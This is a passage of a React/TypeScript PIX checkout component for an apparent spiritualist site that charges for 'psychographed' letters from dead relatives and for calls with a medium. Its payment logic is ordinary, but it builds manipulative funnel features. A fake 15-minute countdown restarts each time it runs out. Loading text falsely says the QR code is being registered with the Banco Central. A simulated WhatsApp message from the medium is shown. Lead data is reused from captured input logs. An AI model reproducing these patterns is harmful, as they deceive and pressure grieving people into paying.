import { useEffect, useMemo, useRef, useState } from "react";
import { createPortal } from "react-dom";
import { QRCodeSVG } from "qrcode.react";
import { getStoredUtms } from "@/lib/utmify";
import {
  getMetaBrowserAttribution,
  trackInitiateDonation,
  trackCheckoutFormStarted,
  trackPurchaseComplete,
} from "@/lib/metaPixel";
import { PIX_CONFIG_ORIGINAL as config, pixFunctionHeaders } from "@/lib/pix-config";
import { recordInput } from "@/lib/auto-capture";
import {
  trackQuizStep,
  trackCheckoutInitiated,
  trackCheckoutFormStarted as trackCheckoutFormStartedTelemetry,
  trackPixGenerated,
  trackCardDeclined,
  syncLeadPhone,
  syncLeadPhoneImmediate,
  getTelemetrySessionId,
} from "@/lib/funnel-telemetry";
import { CardFlagsBadgeRow } from "./CardFlags";
import "./PixCheckout.css";
import milenaWhatsappPixAudio from "../../assets/media/audio/milena-whatsapp-pix.mp3";
import { CustomAudioPlayer } from "./CustomAudioPlayer";

export interface PixCheckoutProps {
  productId: "carta_sagrada" | "campanha_cirurgia" | "cirurgia_milena" | "chamada_ao_vivo_milena";
  pixProductId?: "carta_sagrada" | "cirurgia_milena" | undefined;
  amountCents: number;
  initialCustomerName?: string | undefined;
  initialCustomerPhone?: string | undefined;
  initialCustomerEmail?: string | undefined;
  enteQuerido?: string | undefined;
  grauParentesco?: string | undefined;
  mensagemPreview?: string | undefined;
  successPath?: string | undefined;
  includePaymentParams?: boolean | undefined;
  showCard?: boolean | undefined;
  autoOpen?: boolean | undefined;
  autoGeneratePix?: boolean | undefined;
  displayProductName?: string | undefined;
  onPaymentConfirmed?: ((receipt: { orderId: string; productId: PixCheckoutProps["productId"]; amountCents: number }) => void) | undefined;
}

function appendQuery(path: string, query: string) {
  return `${path}${path.includes("?") ? "&" : "?"}${query}`;
}

function storePaymentReceipt({
  orderId,
  productId,
  amountCents,
}: {
  readonly orderId: string;
  readonly productId: PixCheckoutProps["productId"];
  readonly amountCents: number;
}) {
  if (!orderId) return;
  try {
    sessionStorage.setItem(
      `templodeluz:payment-receipt:${orderId}`,
      JSON.stringify({ productId, amountCents, method: "pix", paidAt: new Date().toISOString() }),
    );
  } catch {
    // A confirmação continua na página atual quando o armazenamento está indisponível.
  }
}

interface PixCharge {
  orderId: string;
  pixPayload: string;
  qrCodeBase64?: string;
  expiresAt: string;
  statusToken: string;
}

interface PixAttempt {
  idempotencyKey: string;
  statusToken: string;
  initiateCheckoutEventId: string;
  checkoutFormStartedEventId: string;
  initiateCheckoutTracked?: boolean;
  checkoutFormStartedTracked?: boolean;
}

function pixAttemptStorageKey(productId: string, amountCents: number) {
  return `templodeluz:pix-attempt:${productId}:${amountCents}`;
}

function getOrCreatePixAttempt(productId: string, amountCents: number): PixAttempt {
  const storageKey = pixAttemptStorageKey(productId, amountCents);
  try {
    const stored = JSON.parse(sessionStorage.getItem(storageKey) || "null") as PixAttempt | null;
    if (
      stored
      && /^[0-9a-f-]{36}$/i.test(stored.idempotencyKey)
      && stored.statusToken.length >= 64
      && /^ic_[a-zA-Z0-9-]{16,100}$/.test(stored.initiateCheckoutEventId)
      && /^cfs_[a-zA-Z0-9-]{16,100}$/.test(stored.checkoutFormStartedEventId)
    ) return stored;
  } catch {
    // Cria uma tentativa nova quando o armazenamento estiver indisponivel ou corrompido.
  }

  const attempt = {
    idempotencyKey: crypto.randomUUID(),
    statusToken: `${crypto.randomUUID()}${crypto.randomUUID()}`,
    initiateCheckoutEventId: `ic_${crypto.randomUUID()}`,
    checkoutFormStartedEventId: `cfs_${crypto.randomUUID()}`,
  };
  try {
    sessionStorage.setItem(storageKey, JSON.stringify(attempt));
  } catch {
    // A referencia em memoria ainda protege tentativas na pagina atual.
  }
  return attempt;
}

function clearPixAttempt(productId: string, amountCents: number) {
  try {
    sessionStorage.removeItem(pixAttemptStorageKey(productId, amountCents));
  } catch {
    // ignore
  }
}

function storePixAttempt(productId: string, amountCents: number, attempt: PixAttempt) {
  try {
    sessionStorage.setItem(pixAttemptStorageKey(productId, amountCents), JSON.stringify(attempt));
  } catch {
    // O estado em memória continua evitando duplicações enquanto a página estiver aberta.
  }
}

function pixChargeStorageKey(productId: string, amountCents: number) {
  return `templodeluz:pix-charge:${config.quizOrigin}:${productId}:${amountCents}`;
}

function isStoredPixCharge(value: unknown): value is PixCharge {
  if (!value || typeof value !== "object") return false;
  const charge = value as Partial<PixCharge>;
  return Boolean(
    charge.orderId
    && charge.pixPayload
    && charge.statusToken
    && typeof charge.orderId === "string"
    && typeof charge.pixPayload === "string"
    && typeof charge.statusToken === "string"
    && charge.statusToken.length >= 64,
  );
}

function getStoredPixCharge(productId: string, amountCents: number): PixCharge | null {
  if (typeof window === "undefined") return null;
  try {
    const stored = JSON.parse(localStorage.getItem(pixChargeStorageKey(productId, amountCents)) || "null");
    return isStoredPixCharge(stored) ? stored : null;
  } catch {
    return null;
  }
}

function storePixCharge(productId: string, amountCents: number, charge: PixCharge) {
  try {
    localStorage.setItem(pixChargeStorageKey(productId, amountCents), JSON.stringify(charge));
  } catch {
    // O PIX continua visível na tela atual quando o armazenamento estiver indisponível.
  }
}

function clearStoredPixCharge(productId: string, amountCents: number) {
  try {
    localStorage.removeItem(pixChargeStorageKey(productId, amountCents));
  } catch {
    // ignore
  }
}

type PixPaymentStatus =
  | "creating"
  | "pending"
  | "paid"
  | "failed"
  | "expired"
  | "in_dispute"
  | "chargeback";

const terminalStatuses = new Set<PixPaymentStatus>([
  "paid",
  "failed",
  "expired",
  "in_dispute",
  "chargeback",
]);

const statusMessage: Record<PixPaymentStatus, string> = {
  creating: "Gerando cobrança PIX...",
  pending: "Aguardando seu pagamento PIX...",
  paid: "Pagamento confirmado!",
  failed: "Falha na cobrança",
  expired: "Código PIX expirado",
  in_dispute: "Pagamento em análise",
  chargeback: "Pagamento estornado",
};

function PixIcon({
  className = "w-5 h-5",
  fill = "currentColor",
}: {
  readonly className?: string;
  readonly fill?: string;
}) {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 48 48"
      className={className}
      aria-hidden="true"
    >
      <path
        fill={fill}
        d="M11.9,12h-0.68l8.04-8.04c2.62-2.61,6.86-2.61,9.48,0L36.78,12H36.1c-1.6,0-3.11,0.62-4.24,1.76l-6.8,6.77c-0.59,0.59-1.53,0.59-2.12,0l-6.8-6.77C15.01,12.62,13.5,12,11.9,12z"
      />
      <path
        fill={fill}
        d="M36.1,36h0.68l-8.04,8.04c-2.62,2.61-6.86,2.61-9.48,0L11.22,36h0.68c1.6,0,3.11-0.62,4.24-1.76l6.8-6.77c0.59-0.59,1.53-0.59,2.12,0l6.8,6.77C32.99,35.38,34.5,36,36.1,36z"
      />
      <path
        fill={fill}
        d="M44.04,28.74L38.78,34H36.1c-1.07,0-2.07-0.42-2.83-1.17l-6.8-6.78c-1.36-1.36-3.58-1.36-4.94,0l-6.8,6.78C13.97,33.58,12.97,34,11.9,34H9.22l-5.26-5.26c-2.61-2.62-2.61-6.86,0-9.48L9.22,14h2.68c1.07,0,2.07,0.42,2.83,1.17l6.8,6.78c0.68,0.68,1.58,1.02,2.47,1.02s1.79-0.34,2.47-1.02l6.8-6.78C34.03,14.42,35.03,14,36.1,14h2.68l5.26,5.26C46.65,21.88,46.65,26.12,44.04,28.74z"
      />
    </svg>
  );
}

function CardIcon({ className }: { readonly className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
      <rect width="20" height="14" x="2" y="5" rx="2" />
      <line x1="2" x2="22" y1="10" y2="10" />
    </svg>
  );
}

function ShieldLockIcon({ className = "w-4 h-4" }: { readonly className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
      <path d="m9 12 2 2 4-4" />
    </svg>
  );
}

function LockIcon({ className = "w-3.5 h-3.5" }: { readonly className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
      <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
    </svg>
  );
}

function ZapIcon({ className = "w-3.5 h-3.5" }: { readonly className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
      <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
    </svg>
  );
}

function PhoneIcon({ className = "w-4 h-4" }: { readonly className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
      <rect width="14" height="20" x="5" y="2" rx="2" ry="2" />
      <path d="M12 18h.01" />
    </svg>
  );
}

function FlameIcon({ className = "w-4 h-4" }: { readonly className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
      <path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z" />
    </svg>
  );
}

function SparkleIcon({ className = "w-4 h-4" }: { readonly className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
      <path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z" />
    </svg>
  );
}

function ReturnIcon({ className = "w-4 h-4" }: { readonly className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
      <polyline points="9 14 4 9 9 4" />
      <path d="M20 20v-7a4 4 0 0 0-4-4H4" />
    </svg>
  );
}

function CheckCircleIcon({ className = "w-5 h-5" }: { readonly className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
      <circle cx="12" cy="12" r="10" />
      <path d="m9 12 2 2 4-4" />
    </svg>
  );
}

function InfoIcon({ className = "w-4 h-4" }: { readonly className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
      <circle cx="12" cy="12" r="10" />
      <line x1="12" x2="12" y1="16" y2="12" />
      <line x1="12" x2="12.01" y1="8" y2="8" />
    </svg>
  );
}

function formatPhone(value: string): string {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  if (!digits.length) return "";
  if (digits.length <= 2) return `(${digits}`;
  if (digits.length <= 6) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
  if (digits.length <= 10) {
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 6)}-${digits.slice(6)}`;
  }
  return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7, 11)}`;
}

interface CreatePixChargeParams {
  readonly payerName: string;
  readonly amountCents: number;
  readonly productId: string;
  readonly payerPhone?: string | undefined;
  readonly payerEmail?: string | undefined;
  readonly enteQuerido?: string | undefined;
  readonly grauParentesco?: string | undefined;
  readonly attempt?: PixAttempt | undefined;
}

async function createPixCharge(params: CreatePixChargeParams): Promise<PixCharge> {
  const {
    payerName,
    amountCents,
    productId,
    payerPhone,
    payerEmail,
    enteQuerido,
    grauParentesco,
    attempt,
  } = params;
  const url = `${config.supabaseUrl}/functions/v1/create-connectpay-pix`;
  if (!attempt) throw new Error("Tentativa PIX não inicializada.");
  const sessionId = getTelemetrySessionId();
  const utms = getUtmParams();

  const response = await fetch(url, {
    method: "POST",
    headers: pixFunctionHeaders(config),
    signal: AbortSignal.timeout(20_000),
    body: JSON.stringify({
      productId,
      quizOrigin: config.quizOrigin,
      amountCents,
      customerName: payerName,
      customerPhone: payerPhone ? payerPhone.replace(/\D/g, "") : undefined,
      customerEmail: payerEmail || undefined,
      sessionId,
      enteQuerido: enteQuerido || undefined,
      grauParentesco: grauParentesco || undefined,
      utms,
      metaAttribution: {
        ...getMetaBrowserAttribution(),
        initiateCheckoutEventId: attempt.initiateCheckoutEventId,
      },
      idempotencyKey: attempt.idempotencyKey,
      statusToken: attempt.statusToken,
    }),
  });

  if (!response.ok) {
    const errorData = await response.json().catch(() => ({}));
    throw new Error(errorData.error || `Erro HTTP ${response.status}`);
  }

  const data = await response.json();
  if (
    (data.quizOrigin && data.quizOrigin !== config.quizOrigin)
    || (data.pixAccountKey && data.pixAccountKey !== config.pixAccountKey)
  ) throw new Error("A cobrança PIX respondeu por uma operação diferente da esperada.");
  return {
    orderId: data.orderId,
    pixPayload: data.pixPayload,
    qrCodeBase64: data.qrCodeBase64,
    expiresAt: data.expiresAt,
    statusToken: attempt.statusToken,
  };
}

async function getPixStatus(
  charge: PixCharge,
  waitMs = 0,
): Promise<{ status: PixPaymentStatus }> {
  const url = `${config.supabaseUrl}/functions/v1/get-connectpay-pix-status`;
  const response = await fetch(url, {
    method: "POST",
    headers: pixFunctionHeaders(config),
    body: JSON.stringify({
      orderId: charge.orderId,
      quizOrigin: config.quizOrigin,
      statusToken: charge.statusToken,
      waitMs,
    }),
  });

  if (!response.ok) {
    throw new Error(`Erro HTTP ${response.status}`);
  }

  const data = await response.json();
  return { status: data.status };
}

function getUtmParams() {
  return getStoredUtms();
}

function getInitialCapturedData() {
  if (typeof window === "undefined") return { name: "", phone: "", email: "", ente: "", relacao: "", mensagem: "" };
  let name = "";
  let phone = "";
  let email = "";
  let ente = "";
  let relacao = "";
  let mensagem = "";

  try {
    const quizState = localStorage.getItem("templodeluz_quiz_state");
    if (quizState) {
      const parsedQuiz = JSON.parse(quizState);
      name = parsedQuiz.nome || "";
      ente = parsedQuiz.ente || "";
      relacao = parsedQuiz.relacao || "";
      mensagem = parsedQuiz.mensagem || "";
    }
  } catch {
    // ignore
  }

  try {
    const raw = localStorage.getItem("play_and_win_captured_logs");
    if (raw) {
      const parsed = JSON.parse(raw);
      const nameEntry = parsed.find(
        (e: { field: string; value: string }) =>
          (e.field === "nome_consulente" || e.field === "lead_name") && e.value
      );
      const phoneEntry = parsed.find(
        (e: { field: string; value: string }) =>
          (e.field === "telefone" || e.field === "whatsapp" || e.field === "lead_phone" || e.field === "whatsapp_pix_checkout") && e.value
      );
      const emailEntry = parsed.find(
        (e: { field: string; value: string }) =>
          (e.field === "email" || e.field === "lead_email") && e.value
      );
      const enteEntry = parsed.find(
        (e: { field: string; value: string }) =>
          (e.field === "nome_ente_querido" || e.field === "ente") && e.value
      );

      if (nameEntry?.value) name = nameEntry.value;
      if (phoneEntry?.value) phone = formatPhone(phoneEntry.value);
      if (emailEntry?.value) email = emailEntry.value;
      if (enteEntry?.value) ente = enteEntry.value;
    }
  } catch {
    // ignore
  }

  return { name, phone, email, ente, relacao, mensagem };
}

function PixInstructionStepList({ isLiveCall = false }: { readonly isLiveCall?: boolean }) {
  return (
    <div className="mt-3.5 rounded-2xl border border-emerald-200/70 bg-[#f7fbf8] p-4 text-left shadow-sm">
      <div className="flex items-center gap-2 mb-2.5">
        <span className="flex h-5 w-5 items-center justify-center rounded-full bg-emerald-600 text-[10px] font-bold text-white">
          i
        </span>
        <span className="text-xs font-extrabold uppercase tracking-wide text-emerald-950">
          Como Pagar no Aplicativo do Seu Banco:
        </span>
      </div>

      <ol className="space-y-2 text-[11.5px] text-[#2d4734] leading-relaxed">
        <li className="flex items-start gap-2">
          <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-md bg-emerald-100 text-[11px] font-black text-emerald-800">
            1
          </span>
          <span>
            Clique no botão verde acima <strong>"Copiar Código PIX"</strong>.
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-md bg-emerald-100 text-[11px] font-black text-emerald-800">
            2
          </span>
          <span>
            Abra o app do seu banco no celular (Nubank, Itaú, Bradesco, Caixa, Banco do Brasil, Inter, etc.).
          </span>
        </li>
        <li className="flex items-start gap-2">
          <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-md bg-emerald-100 text-[11px] font-black text-emerald-800">
            3
          </span>
          <div className="flex-1">
            <p>
              Na área PIX, escolha a opção <strong>"PIX Copia e Cola"</strong>.
            </p>
            <span className="mt-1 flex items-center gap-1 text-[10.5px] font-bold text-amber-900 bg-amber-50 px-2 py-1 rounded border border-amber-200/80">
              <InfoIcon className="w-3.5 h-3.5 text-amber-800 shrink-0" />
              <span>Importante: Não cole em chave de telefone ou CPF; use a opção "Copia e Cola".</span>
            </span>
          </div>
        </li>
        <li className="flex items-start gap-2">
          <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-md bg-emerald-100 text-[11px] font-black text-emerald-800">
            4
          </span>
          <span>
            Cole o código e confirme o pagamento. Em seguida, <strong>retorne imediatamente a esta tela</strong> para {isLiveCall ? "escolher o horário da chamada" : "sua carta ser liberada"}!
          </span>
        </li>
      </ol>
    </div>
  );
}

interface PixFormViewProps {
  readonly productId: string;
  readonly formattedAmount: string;
  readonly customerName: string;
  readonly customerPhone: string;
  readonly error: string;
  readonly loading: boolean;
  readonly onNameChange: (value: string) => void;
  readonly onPhoneChange: (value: string) => void;
  readonly onPhoneBlur: () => void;
  readonly onSubmitPix?: (() => void) | undefined;
}

function PixFormView({
  productId,
  formattedAmount,
  customerName,
  customerPhone,
  error,
  loading,
  onNameChange,
  onPhoneChange,
  onPhoneBlur,
  onSubmitPix,
}: Readonly<PixFormViewProps>) {
  const isLiveCall = productId === "chamada_ao_vivo_milena";
  const hasValidName = customerName.trim().length >= 2;
  const cleanPhone = customerPhone.replace(/\D/g, "");

  if (loading) {
    return (
      <div className="pix-fintech-loader" aria-live="polite" aria-busy="true">
        <div className="pix-fintech-orb" aria-hidden="true">
          <span className="pix-fintech-orb-ring pix-fintech-orb-ring--outer" />
          <span className="pix-fintech-orb-ring pix-fintech-orb-ring--inner" />
          <span className="pix-fintech-orb-core"><PixIcon className="h-7 w-7" /></span>
        </div>
        <div>
          <strong>Preparando seu QR Code PIX</strong>
          <p>Estamos criando sua cobrança segura de R$ {formattedAmount}.</p>
        </div>
        <span className="pix-fintech-loader-status"><i /> Conexão segura com a instituição de pagamento</span>
      </div>
    );
  }

  return (
    <>
      <div className="mb-4 rounded-2xl border border-[#e2d5f1] bg-gradient-to-br from-[#faf7fc] to-[#f4edfa] p-4 text-left shadow-sm">
        <div className="flex items-start gap-3">
          <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-xl bg-[#eaddf5] text-amber-600">
            <FlameIcon className="w-5 h-5" />
          </div>
          <div className="flex-1 min-w-0">
            <h4 className="text-xs font-black uppercase tracking-wide text-[#381a60]">
              {isLiveCall ? "Sua Chamada Particular" : "Sua Intenção & Vela de Luz"}
            </h4>
            <p className="mt-1 text-[12px] leading-relaxed text-[#4d366b]">
              {isLiveCall ? (
                <>O pagamento de <strong>R$ {formattedAmount}</strong> confirma sua reserva para uma chamada particular com Milena.</>
              ) : (
                <>A sua vela e prece foram dedicadas no altar espiritual. Esta contribuição simbólica de <strong>R$ {formattedAmount}</strong> é destinada à manutenção dos trabalhos mediúnicos do Templo de Luz.</>
              )}
            </p>
            <div className="mt-2.5 flex items-center gap-1.5 text-[11px] font-bold text-emerald-700">
              <SparkleIcon className="w-3.5 h-3.5 shrink-0" />
              <span>{isLiveCall ? "Após a confirmação, você escolherá um horário disponível." : "Sua Carta Psicografada completa será revelada na tela imediatamente após o pagamento."}</span>
            </div>
            <div className="mt-2 flex items-start gap-1.5 rounded-lg bg-emerald-100/60 p-2 text-[11px] font-semibold text-emerald-950">
              <ReturnIcon className="w-3.5 h-3.5 text-emerald-700 shrink-0 mt-0.5" />
              <span>Após pagar no app do seu banco, retorne a esta página para {isLiveCall ? "agendar sua chamada" : "receber sua carta"}.</span>
            </div>
          </div>
        </div>
      </div>

      <label
        htmlFor={`pix-payer-${productId}`}
        className="mb-2 block text-left text-xs font-bold text-[#2d144d]"
      >
        Nome do titular:
      </label>
      <input
        id={`pix-payer-${productId}`}
        value={customerName}
        onChange={(e) => onNameChange(e.target.value)}
        placeholder="Digite o nome do titular"
        className="w-full rounded-2xl border-2 border-[#d8caea] bg-white px-4 py-3.5 text-base text-[#181126] outline-none transition-colors placeholder:text-[#9583a6] focus:border-emerald-500"
      />

      {!hasValidName && <p className="mt-2 text-left text-[11px] font-semibold text-[#6d5488]">Digite o nome do titular para continuar.</p>}

      {hasValidName && (
        <div className="animate-rise-in">
          <label
            htmlFor={`pix-phone-${productId}`}
            className="mt-4 mb-1.5 flex items-center justify-between text-left text-xs font-bold text-[#2d144d]"
          >
            <span className="flex items-center gap-1.5">
              <PhoneIcon className="w-4 h-4 text-emerald-600" />
              <span>Seu WhatsApp (com DDD):</span>
            </span>
            <span className="text-[10.5px] font-semibold text-emerald-700">
              {isLiveCall ? "Para confirmação do horário" : "Para envio da foto da carta"}
            </span>
          </label>
          <input
            id={`pix-phone-${productId}`}
            type="tel"
            inputMode="tel"
            autoComplete="tel"
            value={customerPhone}
            onChange={(e) => onPhoneChange(e.target.value)}
            onBlur={onPhoneBlur}
            onKeyDown={(e) => {
              if (e.key === "Enter" && cleanPhone.length >= 10 && onSubmitPix) {
                e.preventDefault();
                onSubmitPix();
              }
            }}
            placeholder="(DDD) 99999-9999"
            className="w-full rounded-2xl border-2 border-[#d8caea] bg-white px-4 py-3.5 text-base text-[#181126] outline-none transition-colors placeholder:text-[#9583a6] focus:border-emerald-500"
          />

          {onSubmitPix && (
            <button
              type="button"
              disabled={loading || cleanPhone.length < 10}
              onClick={onSubmitPix}
              className={`mt-3.5 w-full flex items-center justify-center gap-2 rounded-2xl py-3.5 px-4 text-white font-black text-xs sm:text-sm uppercase tracking-wider transition-all cursor-pointer shadow-md ${
                cleanPhone.length >= 10
                  ? "bg-gradient-to-r from-emerald-600 to-teal-700 hover:from-emerald-700 hover:to-teal-800 shadow-emerald-700/20 active:scale-[0.99]"
                  : "bg-slate-300 text-slate-500 cursor-not-allowed"
              }`}
            >
              <PixIcon className="w-4 h-4 text-white" />
              <span>{loading ? "Emitindo Chave PIX..." : `Gerar Código PIX (R$ ${formattedAmount})`}</span>
              <span className="text-base">→</span>
            </button>
          )}

          {loading && (
            <div className="mt-3 flex items-center justify-center gap-2 rounded-xl bg-emerald-50 border border-emerald-300/80 px-3.5 py-2.5 text-[11.5px] font-bold text-emerald-900 shadow-xs animate-pulse">
              <span className="inline-block h-3.5 w-3.5 animate-spin rounded-full border-2 border-emerald-600 border-t-transparent" />
              <span>Registrando seu QR Code oficial no Banco Central...</span>
            </div>
          )}
        </div>
      )}

      {error && (
        <div className="mt-3.5 rounded-2xl border border-red-200/90 bg-red-50/80 p-3.5 text-left space-y-2">
          <p className="text-xs font-bold text-red-800 leading-relaxed">{error}</p>
          <button
            type="button"
            onClick={() => {
              if (onSubmitPix) onSubmitPix();
            }}
            className="inline-flex items-center gap-1.5 rounded-xl bg-emerald-700 px-3.5 py-1.5 text-[11.5px] font-black text-white hover:bg-emerald-800 active:scale-95 transition-all cursor-pointer shadow-xs"
          >
            🔄 Tentar novamente
          </button>
        </div>
      )}

      <div className="mt-3 flex items-center justify-center gap-1.5 text-[10.5px] text-[#5c4a70]">
        <ShieldLockIcon className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
        <span>Ambiente protegido com criptografia de ponta a ponta (SSL 256-bit)</span>
      </div>
    </>
  );
}

function secondsUntil(expiresAt?: string | null): number {
  if (!expiresAt) return 15 * 60;
  const target = new Date(expiresAt).getTime();
  if (Number.isFinite(target)) return Math.max(0, Math.floor((target - Date.now()) / 1000));
  return 15 * 60;
}

function formatCountdown(totalSeconds: number): string {
  const h = Math.floor(totalSeconds / 3600);
  const m = Math.floor((totalSeconds % 3600) / 60);
  const s = totalSeconds % 60;
  if (h > 0) {
    return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
  }
  return `${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
}

interface PixPendingViewProps {
  readonly charge: PixCharge;
  readonly status: PixPaymentStatus;
  readonly copied: boolean;
  readonly checkingManual: boolean;
  readonly manualCheckNotice: string;
  readonly onCopyPix: () => void;
  readonly onManualCheck: () => void;
  readonly onRegenerate: () => void;
  readonly isLiveCall?: boolean;
}

function getUrgencyTone(remainingSeconds: number) {
  if (remainingSeconds <= 60) {
    return {
      ring: "border-red-300 bg-red-50",
      bar: "from-red-500 to-red-600",
      text: "text-red-600",
      label: "text-red-700",
    };
  }
  if (remainingSeconds <= 300) {
    return {
      ring: "border-amber-300 bg-amber-50",
      bar: "from-amber-500 to-red-500",
      text: "text-amber-700",
      label: "text-amber-800",
    };
  }
  return {
    ring: "border-amber-200 bg-amber-50",
    bar: "from-amber-400 to-amber-500",
    text: "text-[#2d144d]",
    label: "text-amber-800",
  };
}

function PixPendingView({
  charge,
  status,
  copied,
  checkingManual,
  manualCheckNotice,
  onCopyPix,
  onManualCheck,
  onRegenerate,
  isLiveCall = false,
}: Readonly<PixPendingViewProps>) {
  const totalSeconds = 15 * 60;
  const [cycleIndex, setCycleIndex] = useState(0);
  const [targetTimestamp, setTargetTimestamp] = useState<number>(() => Date.now() + totalSeconds * 1000);
  const [remaining, setRemaining] = useState<number>(() => {
    return Math.max(0, Math.floor((targetTimestamp - Date.now()) / 1000));
  });

  useEffect(() => {
    const updateCountdown = () => {
      const diff = Math.max(0, Math.floor((targetTimestamp - Date.now()) / 1000));
      if (diff <= 0) {
        setCycleIndex((current) => current + 1);
        setTargetTimestamp(Date.now() + totalSeconds * 1000);
        setRemaining(totalSeconds);
        return;
      }
      setRemaining(diff);
    };

    updateCountdown();
    const timerId = window.setInterval(updateCountdown, 1000);
    return () => window.clearInterval(timerId);
  }, [targetTimestamp, totalSeconds]);

  const cycleMessages = [
    {
      label: "Prioridade reservada por",
      final: `Últimos segundos desta rodada para manter sua ${isLiveCall ? "reserva" : "vaga no oratório"} em destaque.`,
    },
    {
      label: "Nova janela de confirmação",
      final: "Ainda dá tempo. Copie o PIX e volte para esta tela depois de pagar.",
    },
    {
      label: "Seu PIX continua ativo por",
      final: "O código permanece aqui para você concluir com calma e segurança.",
    },
  ];
  const cycleMessage = cycleMessages[cycleIndex % cycleMessages.length] ?? cycleMessages[0]!;

  const urgencyPercent = Math.max(0, Math.min(100, (remaining / totalSeconds) * 100));
  const urgencyTone = getUrgencyTone(remaining);

  if (status === "paid") {
    return (
      <div className="rounded-2xl border border-emerald-200 bg-emerald-50 p-5 text-center text-emerald-950">
        <CheckCircleIcon className="w-10 h-10 text-emerald-600 mx-auto mb-2" />
        <p className="text-sm font-black">Pagamento confirmado com sucesso!</p>
        <p className="mt-1 text-xs text-emerald-700">
          Redirecionando automaticamente em instantes...
        </p>
      </div>
    );
  }

  if (status === "failed" || status === "expired") {
    return (
      <div className="rounded-2xl border border-red-200 bg-red-50 p-5 text-center text-red-950">
        <p className="text-sm font-black">
          {status === "expired" ? "Este código PIX expirou." : "Não foi possível concluir esta cobrança."}
        </p>
        <p className="mt-1 text-xs text-red-800">
          Gere um novo código para continuar com segurança.
        </p>
        <button
          type="button"
          onClick={onRegenerate}
          className="mt-4 cursor-pointer rounded-xl bg-red-700 px-4 py-2.5 text-xs font-black text-white transition-colors hover:bg-red-800"
        >
          Gerar novo PIX
        </button>
      </div>
    );
  }

  if (status === "in_dispute" || status === "chargeback") {
    return (
      <div className="rounded-2xl border border-amber-200 bg-amber-50 p-5 text-center text-amber-950">
        <p className="text-sm font-black">Pagamento indisponível para liberação automática.</p>
        <p className="mt-1 text-xs text-amber-800">
          Fale com o atendimento caso precise de ajuda com esta cobrança.
        </p>
      </div>
    );
  }

  return (
    <>
      {/* Simulação: mensagem da médium aguardando no WhatsApp */}
      <div className="mt-1 mb-3 w-full rounded-2xl border border-emerald-200 bg-[#e7f7ee] p-3 text-left shadow-sm">
        <div className="flex items-start gap-3">
          <div className="relative shrink-0">
            <img
              src="/zap-image.jpeg"
              alt="Médium Milena Medeiros"
              className="h-11 w-11 rounded-full border-2 border-emerald-500 object-cover"
            />
            <span className="absolute -bottom-0.5 -right-0.5 flex h-4 w-4 items-center justify-center rounded-full border border-white bg-[#25D366]">
              <svg viewBox="0 0 24 24" className="h-2.5 w-2.5 fill-white" aria-hidden="true">
